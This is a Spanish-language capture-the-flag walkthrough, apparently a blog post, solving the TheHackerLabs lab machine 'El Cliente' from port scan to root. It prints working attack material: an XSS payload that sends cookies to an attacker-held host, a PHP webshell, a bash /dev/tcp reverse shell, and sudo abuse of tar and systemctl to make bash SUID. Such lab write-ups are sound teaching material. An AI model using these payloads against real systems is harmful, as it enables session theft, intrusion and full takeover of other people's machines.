---
title: "El Cliente - TheHackerLabs"
date: 2025-10-16
draft: false
slug: "THL-writeup-elCliente"
excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos, nos enfocamos en analizar la página web activa en el puerto 80. Durante el análisis, encontramos un formulario al que le aplicamos pruebas para saber si algún campo es vulnerable a XSS, siendo así que descubrimos que un campo es vulnerable a Blind y Stored XSS. Aplicamos Fuzzing al dominio de la página web para descubrir archivos, directorios y subdominios ocultos, descubriendo un subdominio que resulta ser un login. Aplicamos el Stored XSS para obtener una cookie de sesión, secuestrando la sesión de un usuario del subdominio. Dentro del dashboard, encontramos una sección que nos permite subir archivos. Aplicamos un sniper attack para saber qué archivos podemos subir, descubriendo que podemos subir un archivo tipo phar, siendo así que cargamos una Webshell de PHP, con la que nos mandamos una Reverse Shell para ganar acceso a la máquina víctima. Dentro de la máquina, encontramos un archivo que contiene las credenciales de un usuario, lo que nos permite conectarnos vía SSH. Revisamos los privilegios de este usuario y vemos que puede usar el binario tar como otro usuario, así que utilizamos la guía de GTFOBins para usar un comando que nos permite escalar privilegios, logrando convertirnos en el segundo usuario. Ahora, revisamos los privilegios de este usuario y vemos que puede usar el comando systemctl como el Root. Volvemos a utilizar la guía de GTFOBins para usar un comando que nos permite escalar privilegios, logrando convertirnos en Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "SSH", "Web Enumeration", "Fuzzing", "BurpSuite", "Blind XSS", "Stored XSS", "Sessión Hijacking", "Sniper Attack", "Arbitrary File Upload", "Remote Command Execution (RCE - Webshell)", "User Pivoting", "Abusing Sudoers Privileges On tar Binary", "Abusing Sudoers Privileges On systemctl Binary", "Privesc - Abusing Sudoers Privileges On systemctl Binary", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "Wappalizer"
  - "echo"
  - "ffuf"
  - "gobuster"
  - "php"
  - "BurpSuite"
  - "nc"
  - "bash"
  - "cat"
  - "grep"
  - "pwd"
  - "ssh"
  - "sudo"
  - "GTFOBins"
  - "tar"
  - "systemctl"
links:
  - "https://gtfobins.github.io/gtfobins/tar/"
  - "https://gtfobins.github.io/gtfobins/systemctl/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-elCliente/el_cliente.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.170
PING 192.168.100.170 (192.168.100.170) 56(84) bytes of data.
64 bytes from 192.168.100.170: icmp_seq=1 ttl=64 time=1.63 ms
64 bytes from 192.168.100.170: icmp_seq=2 ttl=64 time=1.22 ms
64 bytes from 192.168.100.170: icmp_seq=3 ttl=64 time=1.45 ms
64 bytes from 192.168.100.170: icmp_seq=4 ttl=64 time=1.66 ms

--- 192.168.100.170 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3136ms
rtt min/avg/max/mdev = 1.224/1.489/1.659/0.173 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.170 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 01:44 CST
Initiating ARP Ping Scan at 01:44
Scanning 192.168.100.170 [1 port]
Completed ARP Ping Scan at 01:44, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 01:44
Scanning 192.168.100.170 [65535 ports]
Discovered open port 22/tcp on 192.168.100.170
Discovered open port 80/tcp on 192.168.100.170
Completed SYN Stealth Scan at 01:45, 56.75s elapsed (65535 total ports)
Nmap scan report for 192.168.100.170
Host is up, received arp-response (0.0012s latency).
Scanned at 2025-10-15 01:44:22 CST for 56s
Not shown: 41872 filtered tcp ports (no-response), 23661 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 56.96 seconds
           Raw packets sent: 113650 (5.001MB) | Rcvd: 23668 (946.764KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente hay 2 puertos abiertos. Supongo que la intrusión será por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.100.170 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 01:45 CST
Nmap scan report for arka.thl (192.168.100.170)
Host is up (0.00099s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 16:91:39:66:59:eb:2f:c5:65:3c:9a:41:31:1a:f3:37 (ECDSA)
|_  256 a7:87:77:81:bd:ce:b2:7b:78:a6:39:00:8b:03:91:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))

|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Arka Construcciones
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El escaneo nos muestra contenido en la página web activa en el **puerto 80**, por lo que es la única opción que tenemos para empezar.

Vamos a analizarla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura1.png">
</p>

Parece ser una página sobre una empresa constructora.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura2.png">
</p>

No hay mucho que destacar.

Haciendo un poco de **Hovering**, podremos ver que en el botón de **Contacto**, nos lleva a una página llamada **contact.php** ligada a un dominio:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura3.png">
</p>

Vamos a registrar ese dominio en el `/etc/hosts`:
```bash
echo "192.168.100.170 arka.thl" >> /etc/hosts
```

Una vez que lo guardemos, ya podremos visitar esa página, que resulta ser un formulario:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura4.png">
</p>

Como hay muchos campos en el formulario, puede que alguno sea vulnerable a **XSS**.

Siendo esto último lo más destacable de la página web, aplicamos **Fuzzing** para ver si existe un archivo o directorio oculto.

### Fuzzing {#fuzz}

Primero usaremos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://arka.thl/FUZZ -t 300 -e .php,.txt,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://arka.thl/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 9407, Words: 766, Lines: 191, Duration: 1075ms]
assets                  [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 17ms]
images                  [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 1501ms]
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 109ms]
README.txt              [Status: 200, Size: 1344, Words: 173, Lines: 45, Duration: 30ms]
javascript              [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 14ms]
about-us.php            [Status: 200, Size: 2982, Words: 285, Lines: 83, Duration: 64ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 83ms]
contact.php             [Status: 200, Size: 4939, Words: 436, Lines: 123, Duration: 6983ms]
process.php             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 61ms]
views                   [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 77ms]
LICENSE.txt             [Status: 200, Size: 17128, Words: 2798, Lines: 64, Duration: 419ms]
.php                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 106ms]
.html                   [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 115ms]
                        [Status: 200, Size: 9407, Words: 766, Lines: 191, Duration: 263ms]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 197ms]
:: Progress: [882180/882180] :: Job [1/1] :: 232 req/sec :: Duration: [0:16:12] :: Errors: 1523 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*       | Para indicar una busqueda de archivos específicos. |

Ahora probaremos con **gobuster**:
```bash
gobuster dir -u http://arka.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 -x php,txt,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://arka.thl
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact.php          (Status: 200) [Size: 4939]
/images               (Status: 301) [Size: 305] [--> http://arka.thl/images/]
/index.php            (Status: 200) [Size: 9407]
/assets               (Status: 301) [Size: 305] [--> http://arka.thl/assets/]
/db.php               (Status: 200) [Size: 0]
/README.txt           (Status: 200) [Size: 1344]
/javascript           (Status: 301) [Size: 309] [--> http://arka.thl/javascript/]
/about-us.php         (Status: 200) [Size: 2982]
/config.php           (Status: 200) [Size: 0]
/process.php          (Status: 200) [Size: 0]
/views                (Status: 301) [Size: 304] [--> http://arka.thl/views/]
/LICENSE.txt          (Status: 200) [Size: 17128]
/server-status        (Status: 403) [Size: 273]
Progress: 882176 / 882176 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar una busqueda de archivos específicos. |

En ambos casos, podemos ver que hay varios archivos en **PHP**, pero al querer abrir la mayoría de estos, no veremos nada de contenido.

Sin embargo, tengamos en cuenta algunos como el archivo **db.php** para más adelante.

Vamos a comprobar si alguno de los campos del formulario, es vulnerable a **XSS**.

## Explotación de Vulnerabilidades {#Explotacion}

### Identificando Blind XSS y Stored XSS en un Campo del Formulario {#XSS}

Antes que nada, vamos a hacer una prueba enviando datos random:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura5.png">
</p>

Observa que no nos permite mandar cualquier cosa, pues casi todos los campos deben cumplir con el dato que se pide, con excepción del campo para escribir un mensaje.

Puede que este campo sea el vulnerable a **XSS**, pero al usar payloads de prueba, no se reproduce nada al mandar los datos, por lo que puede que nos estemos enfrentando ante un **Blind XSS**.

Comprémoslo:

* Levanta un servidor de **PHP**:
```bash
php -S 0.0.0.0:80
[Thu Oct 16 00:18:23 2025] PHP 8.4.11 Development Server (http://0.0.0.0:80) started
```

* Utiliza el siguiente payload:
```bash
"><script src=http://Tu_IP/XSS></script>
```

* Escríbelo en el campo y envíalo:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura6.png">
</p>

* Observa el servidor de **PHP**:
```bash
php -S 0.0.0.0:80
[Thu Oct 16 00:41:54 2025] PHP 8.4.11 Development Server (http://0.0.0.0:8080) started
[Thu Oct 16 00:43:03 2025] 192.168.100.170:39334 Accepted
[Thu Oct 16 00:43:03 2025] 192.168.100.170:39334 [404]: GET /XSS - No such file or directory
[Thu Oct 16 00:43:03 2025] 192.168.100.170:39334 Closing
[Thu Oct 16 00:43:06 2025] 192.168.100.170:39342 Accepted
[Thu Oct 16 00:43:06 2025] 192.168.100.170:39342 [404]: GET /XSS - No such file or directory
[Thu Oct 16 00:43:06 2025] 192.168.100.170:39342 Closing
[Thu Oct 16 00:44:04 2025] 192.168.100.170:33076 Accepted
[Thu Oct 16 00:44:04 2025] 192.168.100.170:33076 [404]: GET /XSS - No such file or directory
[Thu Oct 16 00:44:04 2025] 192.168.100.170:33076 Closing
[Thu Oct 16 00:44:06 2025] 192.168.100.170:33078 Accepted
[Thu Oct 16 00:44:06 2025] 192.168.100.170:33078 [404]: GET /XSS - No such file or directory
[Thu Oct 16 00:44:06 2025] 192.168.100.170:33078 Closing
...
```
Excelente, acabamos de descubrir que no solo es vulnerable a **Blind XSS**, pues al tener más de una respuesta, significa que el payload quedó almacenado, por lo que es vulnerable a **Stored XSS**.

Aunque todavía no nos sirve de mucho esta vulnerabilidad, así que tengámosla en cuenta para más adelante.

### Descubriendo Subdominio Utilizando Fuzzing y Aplicando Sessión Hijacking (Secuestro de Sesión) Explotando Stored XSS Descubierto {#AdminLogin}

Al no descubrir otra vulnerabilidad, nos enfocamos en seguir aplicando **Fuzzing**.

Una prueba que siempre debemos hacer cuando encontramos un dominio, es aplicarle **Fuzzing** para descubrir subdominios.

Vamos a hacerlo con **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://arka.thl/ -H 'Host: FUZZ.arka.thl' -t 300 -fs 9407

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://arka.thl/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Header           : Host: FUZZ.arka.thl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 9407
________________________________________________

admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 86ms]
Admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 205ms]
:: Progress: [87664/87664] :: Job [1/1] :: 185 req/sec :: Duration: [0:03:23] :: Errors: 710 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-H*       | Para indicar el uso de una cabecera. |
| *-fs*      | Para filtrar por el tamaño de la respuesta obtenida por HTTP. |

Muy bien, encontramos un subdominio.

Para que podamos verlo, recuerda agregar el subdominio al archivo `/etc/hosts`.

Vamos a visitarlo:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura7.png">
</p>

Encontramos un login, pero no tenemos credenciales.

Quizá podamos aplicarle fuerza bruta, sin embargo, esto es una clara pista de que debemos aplicar **Session Hijacking**.

| **Session Hijacking** |
|:---------------------:|
| *Session hijacking (o secuestro de sesión) es una técnica de ataque en la que un atacante toma control de la sesión activa de un usuario legítimo en un sistema o aplicación, sin necesidad de autenticarse.* |

Para aplicarlo, necesitamos otra vez el servidor de **PHP**, pero usaremos otro puerto:
```bash
php -S 0.0.0.0:8088
[Thu Oct 16 00:58:55 2025] PHP 8.4.11 Development Server (http://0.0.0.0:8088) started
```

Utilizaremos el siguiente payload:
```bash
<img src=x onerror="document.location='http://Tu_IP:8088/Cookie/'+document.cookie">
```

Escríbelo en el campo vulnerable y envía los datos:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura8.png">
</p>

Observa el servidor de **PHP**:
```bash
php -S 0.0.0.0:8088
[Thu Oct 16 0:58:55 2025] PHP 8.4.11 Development Server (http://0.0.0.0:8088) started
[Thu Oct 16 01:05:03 2025] 192.168.100.170:49232 Accepted
[Thu Oct 16 01:05:03 2025] 192.168.100.170:49232 [404]: GET /Cookie/PHPSESSID=5a2tbfvupdp6bs100k6bjcltlg - No such file or directory
[Thu Oct 16 01:05:03 2025] 192.168.100.170:49232 Closing
[Thu Oct 16 01:05:03 2025] 192.168.100.170:49234 Accepted
...
```
Tenemos una cookie.

Cópiala y utiliza la herramienta **Inspección** de tu navegador para agregar esa cookie en la sección **Storage**:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura9.png">
</p>

Recarga la página y ya deberíamos tener una sesión activa:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura10.png">
</p>

**Nota**: Aquí será un poco complicado porque justo en el dashboard es donde se ejecuta el **Stored XSS**, pero intenta entrar en la sección llamada Proyectos solamente regresando la página.

### Aplicando Sniper Attack con BurpSuite para Identificar Archivos Aceptados en Página Web de Administrador {#Sniper}

La página tiene una sección llamada **Proyectos**, que al entrar veremos que es posible cargar archivos:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura11.png">
</p>

También tenemos la lista de archivos que son aceptados.

Sin embargo, podemos aplicar el **Sniper Attack** para saber si acepta algún otro tipo de archivo.

Primero, capturemos la subida de un archivo random con **BurpSuite** y la mandamos al **Intruder**:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura12.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura13.png">
</p>

Vamos a configurar el ataque eligiendo la extensión de nuestro archivo, para que ahí se use un wordlist de extensiones:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura14.png">
</p>

Observa los pasos para configurar el **Sniper Attack**:
* 1.- Comprobamos que el ataque sea el correcto.
* 2.- Comprobamos que la ruta a atacar sea correcta.
* 3.- Seleccionamos la extensión de nuestro archivo y la añadimos al ataque con el botón **Add**.
* 4.- Seleccionamos el tipo de payload, siendo un **Simple List**.
* 5.- Cargamos nuestro wordlist, en mi caso utilicé el wordlist de **Seclist**: `/../seclist/Fuzzing/extensions-most-common.fuzz.txt`.
* 6.- Quitamos la opción de **URL-encode...** para que no URL encodee las peticiones, con tal de evitar fallas en el ataque.
* 7.- Ya con todo esto listo, lanzamos el ataque.

Analizando el resultado, podemos ver que hay un mensaje de error en una de las extensiones que sí acepta, que serían archivos **PDF**:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura15.png">
</p>

Quiero suponer que es por el **Content-Type**, ya que el ataque lo dejamos como `text/plain`.

Además, vemos este mismo mensaje en la extensión **phar**:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura16.png">
</p>

Esto ya nos dice nuestra próxima acción, que sería crear una **Webshell** con extensión **phar** para poder ejecutar comandos desde la página web.

### Cargando Webshell de PHP con Extensión Phar para Ejecutar Comandos y Ganando Acceso a la Máquina Víctima {#Webshell}

Vamos a crear nuestra **Webshell** con el siguiente script de **PHP**:
```php
<?php
	system($_GET['cmd']);
?>
```
Recuerda que el nombre del archivo debe contener la extensión **.phar**.

Luego, la cargamos a la página web:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura17.png">
</p>

Observa que nos acepta el archivo y nos lo muestra en la parte derecha de la página:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura18.png">
</p>

Solamente dale clic en donde dice **Link** y nos llevará directamente a nuestra **Webshell**.

Una vez ahí, ya podremos ejecutar comandos:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura19.png">
</p>

Con esto listo, podemos mandarnos una **Reverse Shell** para ganar acceso principal a la máquina víctima.

Levanta un listener con **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Utiliza la siguiente **Reverse Shell**:
```bash
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
```

Ejecútala en la **Webshell**:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura20.png">
</p>

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.170] 39716
bash: cannot set terminal process group (756): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.2$ whoami
whoami
www-data
```
Estamos dentro.

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Listo, continuemos.

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima y Ganando Acceso vía SSH como Usuario scott {#linEnum}

Veamos qué usuarios existen en la máquina víctima:
```bash
bash-5.2$ cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
kobe:x:1000:1000:kobe:/home/kobe:/bin/bash
scott:x:1001:1001:Scott,,,:/home/scott:/bin/bash
```
Hay 2 usuarios (sin contar al **Root**).

Encontraremos sus directorios en el directorio `/home`:
```bash
bash-5.2$ ls -la /home
total 16
drwxr-xr-x  4 root  root  4096 Dec 15  2024 .
drwxr-xr-x 22 root  root  4096 Dec 15  2024 ..
drwxr-x---  6 kobe  kobe  4096 Dec 15  2024 kobe
drwxr-x---  3 scott scott 4096 Oct 17 07:41 scott
```
Pero no podremos ver el contenido de sus directorios.

Observa dónde nos encontramos:
```bash
bash-5.2$ pwd
/var/www/html/admin.arka.thl/uploads
```

Si retrocedemos un directorio, encontraremos los mismos archivos que descubrimos en el dominio cuando le aplicamos **Fuzzing**:
```bash
bash-5.2$ cd ..
bash-5.2$ ls
LICENSE  README.md  config.php	css  db.php  img  index.php  js  login.php  logout.php	projects.php  uploads  utils.php  validate.php	vendor
```

Veamos qué contiene ese archivo **db.php**:
```bash
bash-5.2$ cat db.php 
<?php
const DB_HOST = '127.0.0.1';
const DB_USER = 'scott';
const DB_PASSWORD = '***********';
const DB_NAME = 'arka_db';

$mysqli = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);

if (mysqli_error($mysqli)) {
  die('Ocurrio un error al conectarse a la base de datos ' . mysqli_error($mysqli));
}
```
Excelente, tenemos la contraseña del **usuario scott**.

Podríamos enumerar la base de datos de **MySQL**, pero dentro no encontraremos algo que valga la pena.

Así que, probamos estas credenciales en el **servicio SSH**:
```bash
ssh scott@192.168.100.170
scott@192.168.100.170's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-85-generic x86_64)
...
Last login: Fri Oct 17 07:41:41 2025
scott@TheHackersLabs-ElCliente:~$ whoami
scott
```
Estamos dentro como un nuevo usuario, pero aquí no encontraremos la flag del usuario.

### Abusando de Permisos Sudoers sobre Binario tar para Escalar Privilegios y Convertirnos en el Usuario kobe {#Tar}

Veamos qué privilegios tiene nuestro usuario:
```bash
scott@TheHackersLabs-ElCliente:~$ sudo -l
[sudo] password for scott: 
Matching Defaults entries for scott on TheHackersLabs-ElCliente:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User scott may run the following commands on TheHackersLabs-ElCliente:
    (kobe) PASSWD: /usr/bin/tar
```
Podemos usar el binario **tar** como el **usuario kobe**.

Encontraremos una forma de escalar privilegios usando este binario, dentro de la **guía de GTFOBins**:
* <a href="https://gtfobins.github.io/gtfobins/tar/" target="_blank">GTFOBins: tar</a>

Utilizaremos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura21.png">
</p>

Probémoslo:
```bash
scott@TheHackersLabs-ElCliente:~$ sudo -u kobe tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
$ whoami
kobe
$ /bin/bash -i
kobe@TheHackersLabs-ElCliente:/home/scott$ whoami
kobe
```
Muy bien, ahora somos el **usuario kobe**.

En su directorio encontraremos la flag del usuario:
```bash
kobe@TheHackersLabs-ElCliente:/home/scott$ cd ../kobe/
kobe@TheHackersLabs-ElCliente:~$ ls
user.txt
kobe@TheHackersLabs-ElCliente:~$ cat user.txt
...
```

### Abusando de Permisos Sudoers sobre Binario systemctl para Escalar Privilegios y Convertirnos en Root {#Systemctl}

Veamos qué privilegios tiene nuestro usuario:
```bash
kobe@TheHackersLabs-ElCliente:~$ sudo -l
Matching Defaults entries for kobe on TheHackersLabs-ElCliente:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User kobe may run the following commands on TheHackersLabs-ElCliente:
    (ALL) NOPASSWD: /bin/systemctl
```
Podemos usar el binario **systemctl** como **Root**.

Encontraremos al menos 3 formas para escalar privilegios en la **guía de GTFOBins**:
* <a href="https://gtfobins.github.io/gtfobins/systemctl/" target="_blank">GTFOBins: systemctl</a>

Utilizaremos la **opción B** que nos permite ejecutar comandos como **Root**:

<p align="center">
<img src="/assets/images/THL-writeup-elCliente/Captura22.png">
</p>

Probémoslo, ejecutando el comando **id** y guardando el resultado en un archivo que ubicaremos en el directorio del **usuario kobe**:
```bash
kobe@TheHackersLabs-ElCliente:~$ TF=$(mktemp).service
kobe@TheHackersLabs-ElCliente:~$ echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "id > /home/kobe/id.txt"
[Install]
WantedBy=multi-user.target' > $TF
kobe@TheHackersLabs-ElCliente:~$ sudo systemctl link $TF
kobe@TheHackersLabs-ElCliente:~$ sudo systemctl enable --now $TF
```

Deberíamos tener ya el archivo con el output del comando **id**:
```bash
kobe@TheHackersLabs-ElCliente:~$ ls
id.txt	user.txt
kobe@TheHackersLabs-ElCliente:~$ cat id.txt 
uid=0(root) gid=0(root) groups=0(root)
```
Funcionó, podemos ejecutar comandos.

Lo que podemos hacer es, darle **permisos SUID** a la **Bash** para escalar privilegios.

Puedes comprobar qué permisos tiene ahora la **Bash**:
```bash
kobe@TheHackersLabs-ElCliente:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Modifiquemos el comando anterior para que le asigne **permisos SUID** a la **Bash**:
```bash
kobe@TheHackersLabs-ElCliente:~$ echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
kobe@TheHackersLabs-ElCliente:~$ sudo systemctl link $TF
kobe@TheHackersLabs-ElCliente:~$ sudo systemctl enable --now $TF
```

Revisa de nuevo los permisos de la **Bash**:
```bash
kobe@TheHackersLabs-ElCliente:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```
Se cambiaron.

Ya podemos usar la **Bash** con privilegios:
```bash
kobe@TheHackersLabs-ElCliente:~$ bash -p
bash-5.2# whoami
root
```
Somos **Root**.

Obtengamos la última flag:
```bash
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
...
```
Y con esto, terminamos la máquina.
